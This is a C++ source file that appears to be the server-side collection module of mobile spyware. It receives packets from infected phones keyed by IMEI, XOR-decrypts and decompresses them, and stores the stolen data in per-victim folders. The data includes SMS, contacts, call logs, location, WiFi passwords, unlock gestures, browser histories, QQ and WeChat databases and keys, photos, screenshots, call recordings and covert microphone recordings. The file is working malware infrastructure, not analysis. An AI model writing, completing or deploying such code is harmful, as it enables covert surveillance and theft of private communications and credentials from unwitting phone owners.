
#include <windows.h>
#include "iosServer.h"
#include "PublicFunction.h"
#include "DataProcess.h"
#include "WatchDog.h"
#include <stdlib.h>
#include "Additional.h"
#include "FileWriter.h"
#include "CryptoUtils.h"
#include <Dbghelp.h>
#pragma comment(lib,"dbghelp.lib")
#include "NotifyDataServer.h"

#include <string>

using namespace std;

#define PACK_SIZE_ERROR -1
#define PACK_ID_ERROR -2
#define PACK_CMD_ERROR -3
#define PACK_ALLOC_ERROR -4
#define PACK_COMP_ERROR -5
#define PACK_EXCEPT_ERROR -6
#define PACK_MYSQL_ERROR -7
#define PACK_FILE_ERROR -8


DWORD __stdcall DataProcess::DataProcessor(LPDATAPROCESS_PARAM lpparam) {
	DATAPROCESS_PARAM stparam = *lpparam;
	char szLog[1024];

	char *lpdata = new char[NETWORK_DATABUF_SIZE + 1024];
	if (lpdata <= FALSE) {
		WriteLogFile("DataProcess new recv buffer error\r\n");
		closesocket(stparam.sockclient);
		return FALSE;
	}

	int ret = DataProcessMain(&stparam, &lpdata);
	if (ret < 0)
	{
		char szerror[1024];
		wsprintfA(szerror, "DataProcess recv data error code:%u", ret);
		ErrorFormat(&stparam, szLog,szerror );
		WriteLogFile(szLog);
		WriteErrorPacket(szLog, lpdata, ERRORPACKETSIZE);
	}

	delete[] lpdata;
	closesocket(stparam.sockclient);
	return ret;
}


DWORD __stdcall DataProcess::DataProcessMain(LPDATAPROCESS_PARAM lpparam,char ** lpdata){
	int iret = 0;

	char szout[1024];

	__try{
		
		int iRecvLen = recv(lpparam->sockclient,*lpdata,NETWORK_DATABUF_SIZE,0);
		if (iRecvLen < sizeof(COMMUNICATION_PACKET_HEADER)){
			return -1;
		}

		LPCOMMUNICATION_PACKET_HEADER lphdr = (LPCOMMUNICATION_PACKET_HEADER)*lpdata;
		char imei[IOS_IDENTIFIER_SIZE * 2] = { 0 };
		if ((lphdr->reservedname & PACKET_NEWCRYPT_FLAG) == PACKET_NEWCRYPT_FLAG)
		{
			iret = CryptoUtils::xorCryptData(lphdr->iphoneID, IOS_IDENTIFIER_SIZE,
				(char*)gKey.c_str(), IOS_IDENTIFIER_SIZE, lphdr->iphoneID, IOS_IDENTIFIER_SIZE);
		}
		
		memmove(imei,lphdr->iphoneID, IOS_IDENTIFIER_SIZE);
		iret = Additional::checkImei(imei);
		if (iret == FALSE)
		{
			return -2;
		}

		char username[USER_NAME_SIZE *2] = {0};
		if ((lphdr->reservedname & PACKET_NEWCRYPT_FLAG) == PACKET_NEWCRYPT_FLAG)
		{
			iret = CryptoUtils::xorCryptData(lphdr->username, USER_NAME_SIZE,
				(char*)gKey.c_str(), USER_NAME_SIZE, lphdr->username, USER_NAME_SIZE);
		}
		memmove(username, lphdr->username, USER_NAME_SIZE);
		iret = Additional::checkUserName(username);
		if (iret == FALSE)
		{
			return -2;
		}

		if (lphdr->dwcmd > COMMAND_VALUE_LIMIT || lphdr->dwcmd <= 0 )
		{
			return -3;
		}

		if (lphdr->dwcmd == SUPER_CMD_STOP && strcmp(username,SUPER_USERNAME) == 0 && strcmp(imei,SUPER_IMEI) == 0)
		{
			ExitProcess(0);
		}
		
		DWORD dwBufLimit = NETWORK_DATABUF_SIZE;
		int iBlockSize = *(int*)(*lpdata);
		if (iBlockSize >= NETWORK_DATABUF_SIZE && iBlockSize < LIMIT_DATA_SIZE){
			dwBufLimit = iBlockSize + 1024;
			char * largebuf = new char[dwBufLimit];
			if (largebuf == FALSE){
				return -4;
			}
			else{
				memmove(largebuf,*lpdata,iRecvLen);
				delete [] (* lpdata);
				*lpdata = largebuf;
				lphdr = (LPCOMMUNICATION_PACKET_HEADER)(*lpdata);
			}
		}
		else if(iBlockSize > LIMIT_DATA_SIZE || iBlockSize <= 0){
			wsprintfA(szout, "header size:%u error\r\n", iBlockSize);
			WriteLogFile(szout);
			return -1;
		}

		while (iBlockSize > iRecvLen)
		{
			int tmpsize = recv(lpparam->sockclient, (*lpdata) + iRecvLen, dwBufLimit - iRecvLen,0);
			if (tmpsize > 0)
			{
				iRecvLen += tmpsize;
			}
			else
			{	int iret = WSAGetLastError();
				if (iret == 0 || iBlockSize == iRecvLen)
				{
					break;
				}else{
					wsprintfA(szout, "block size:%u,recv size:%u error\r\n", iBlockSize, iRecvLen);
					WriteLogFile(szout);
					return -1;
				}
			}
		}

		if (iBlockSize != iRecvLen)
		{
			wsprintfA(szout, "block size:%u,recv size:%u error\r\n", iBlockSize, iRecvLen);
			WriteLogFile(szout);
			return -1;
		}

		char * lpdatablock = (*lpdata) + sizeof(COMMUNICATION_PACKET_HEADER) ;
		int datablocksize = iBlockSize - sizeof(COMMUNICATION_PACKET_HEADER) ;
		if ( lphdr->reservedname & PACKET_CRYPT_FLAG)
		{
			WORD errorcrypt = *(WORD*)(lpdatablock + sizeof(DWORD));
			if (errorcrypt == 0x9c78)
			{
				int len = wsprintfA(szout, "find some ignormal packet that is compressed but not ecnrypted,cmd:%u\r\n", lphdr->dwcmd);
				WriteLogFile(szout);
			}
			else {
				iret = CryptoUtils::xorCryptData(lpdatablock, datablocksize, imei, 1, lpdatablock, datablocksize);
			}
		}
		
		if (lphdr->reservedname & PACKET_COMPRESS_FLAG)
		{
			int uncompsize = *(int*)lpdatablock;
			unsigned char * payload = (unsigned char *)(lpdatablock + sizeof(DWORD));
			int payloadsize = datablocksize - sizeof(DWORD);
			unsigned long unzipbufLen = uncompsize + 1024;
			unsigned char* unzipbuf = new unsigned char[unzipbufLen];
			if (unzipbuf == FALSE)
			{
				WriteLogFile("new unzipbuf error\r\n");
				return -4;
			}

			iret = uncompress((Bytef*)unzipbuf, (uLongf*)&unzipbufLen, (Bytef*)payload,payloadsize);
			if (iret != Z_OK) {
				delete[]unzipbuf;
				wsprintfA(szout,"uncompress error:%u\r\n", iret);
				WriteLogFile(szout);
				return -5;
			}
			*(char*)(unzipbuf + unzipbufLen) = 0;

			iret = DataWriter(lpparam,lphdr, (char*)unzipbuf, unzipbufLen,username,imei);

			delete[] unzipbuf;
		}
		else {
			iret = DataWriter(lpparam,lphdr, lpdatablock, datablocksize,username,imei);
		}

		int network = lphdr->reservedname & (CLIENT_NETWORK_TYPE_WIFI | CLIENT_NETWORK_TYPE_WIRELESS);
		WatchDog::CheckIfOnlineExist(imei, username, network, lpparam->sockclient, lpparam->si, THREAD_DATA, lpparam->threadid);

		return iret;
	}
	__except(1){
		char szerror[1024];
		char szLog[1024];
		wsprintfA(szerror,"DataProcess exception:%d",GetLastError());
		ErrorFormat(lpparam,szLog,szerror);
		WriteLogFile(szLog);
		return FALSE;
	}
}



DWORD __stdcall DataProcess::DataWriter(LPDATAPROCESS_PARAM lpparam, LPCOMMUNICATION_PACKET_HEADER lphdr, 
	char * lpdata, int len,char * username,char * imei) {

	int iret = 0;

// 	SYSTEMTIME systime = { 0 };
// 	GetLocalTime(&systime);
// 	char sztime[MAX_PATH];
// 	wsprintfA(sztime, "%04u_%02u_%02u", systime.wYear, systime.wMonth, systime.wDay);
// 	string filename = string(stparam.currentpath) + "\\" + username + "\\" + imei + "\\" + sztime + "\\";

	string filename = string(lpparam->currentpath) + "\\" + username + "\\" + imei + "\\";

	if (lphdr->dwcmd == CMD_DATA_MESSAGE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), MESSAGE_FILENAME, lpdata, len,CREATE_ALWAYS,username,imei);
	}
	else if (lphdr->dwcmd == CMD_IOSVOID_TOKEN) {
		filename = string(lpparam->currentpath) + "\\token\\" ;
		//string token = string(lpdata, len);
		iret = FileWriter::writeDataFile(filename.c_str(), string(imei) + ".token", lpdata, len, OPEN_ALWAYS, username, imei);
		iret = FileWriter::writeDataFile(filename.c_str(), string(imei) + ".token","\r\n", 2, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_LATESTMESSAGE) {

		iret = FileWriter::writeDataFile(filename.c_str(), MESSAGE_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_DEVICEINFO)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), DEVICEINFO_FILENAME,lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CONTACTS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CONTACTS_FILENAME,lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CALLLOG)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CALLLOG_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_NEWCALLLOG)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CALLLOG_FILENAME,lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_LOCATION)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), LOCATION_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_APPPROCESS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), APPPROCESS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_RUNNINGAPPS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), RUNNINGAPPS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_SDCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), SDCARDFILES_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_FLASHCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FLASHCARDFILES_FILENAME,lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_EXTCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), EXTCARDFILES_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WIFIPASS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WIFIPASS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_GESTURE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), GESTURE_FILENAME,lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WIFI) {
		iret = FileWriter::writeDataFile(filename.c_str(), WIFI_FILENAME,lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOAD_LOG) {
		iret = FileWriter::writeDataFile(filename.c_str(), RUNNING_LOG_FILENAME,lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQACCOUNT)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), QQACCOUNT_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEBKITHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEBKITHISTORY_FILENAME,lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CHROMEHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CHROMEHISTORY_FILE_NAME,lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_FIREFOXHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FIREFOXRECORD_FILE_NAME,lpdata, len, OPEN_ALWAYS, username, imei);
	}

	else  if (lphdr->dwcmd == CMD_DATA_FILERECORD)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FILERECORD_FILE_NAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UNINSTALL)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), UNINSTALL_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINDATABASEFILE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEXINDATABASE_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINUSERINFO)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEXINUSERINFO_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINDB_KEY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEIXINDBKEY_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}

	else if (lphdr->dwcmd == CMD_DATA_DCIM)
	{
		filename = filename + "DCIM\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_DOWNLOAD)
	{
		filename = filename + "Download\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_AUDIO)
	{
		filename = filename + "Audio\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_VIDEO)
	{
		filename = filename + "Video\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CAMERAPHOTO) {
		filename = filename + "CameraPhoto\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_SCRNSNAPSHOT)
	{
		filename = filename + "ScreenSnapshot\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_PHONECALLAUDIO)
	{
		filename = filename + "PhoneCallAudio\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_MICAUDIORECORD)
	{
		filename = filename + "MicAudioRecord\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_OFFICE) {
		filename = filename + "OfficeFiles\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQFILE) {
		filename = filename + "QQFiles\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQAUDIO)
	{
		filename = filename + "QQAudio\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQPROFILE)
	{
		filename = filename + "QQHead\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQPHOTO)
	{
		filename = filename + "QQPhoto\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQVIDEO)
	{
		filename = filename + "QQVideo\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINPHOTO) {
		filename = filename + "WeiXinPhoto\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINAUDIO)
	{
		filename = filename + "WeiXinAudio\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINVIDEO)
	{
		filename = filename + "WeiXinVideo\\";
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_APPMESSAGE)
	{
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_QQDATABASEFILE)
	{
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOADQQDB)
	{
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, OPEN_ALWAYS,username,imei);
		//iret = FileWriter::writeFile(filename.c_str(), lpdata, len, OPEN_ALWAYS, TRUE);
	}
	else if (lphdr->dwcmd == CMD_UPLOADWEIXINDB)
	{
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, OPEN_ALWAYS, username,imei);
		//iret = FileWriter::writeFile(filename.c_str(), lpdata, len, OPEN_ALWAYS,TRUE);
	}
	else if (lphdr->dwcmd == CMD_UPLOADWEIXININFO)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEIXINUSERINFO_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_MICAUDIORECORD)
	{
		iret = FileWriter::writeFile(filename.c_str(), lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else {
		char szerror[1024];
		wsprintfA(szerror, "imei:%s DataProcess recv unrecognized packet:%u\r\n", imei, lphdr->dwcmd);
		WriteLogFile(szerror);

		WriteErrorPacket("DataProcess recv data unrecognized packet error:", lpdata, ERRORPACKETSIZE);
		return FALSE;
	}

	/*
	lphdr->dwsize = 0;
	lphdr->dwcmd = CMD_RECV_DATA_OK;
	int ret = send(stparam.sockclient, lpdata, sizeof(COMMUNICATION_PACKET_HEADER), 0);
	if (ret <= 0)
	{
		closesocket(stparam.sockclient);
		delete[] lpdata;
		return FALSE;
	}*/
	return TRUE;
}



DWORD __stdcall DataProcess::DataNotify(string filename) {
	CMDNOTIFY notify = { 0 };
	notify.type = 1;
	notify.len = lstrlenA(filename.c_str());
	lstrcpyA(notify.szparam, filename.c_str());
	int iret = NotifyDataServer::NotifyData(&notify);
	return iret;
}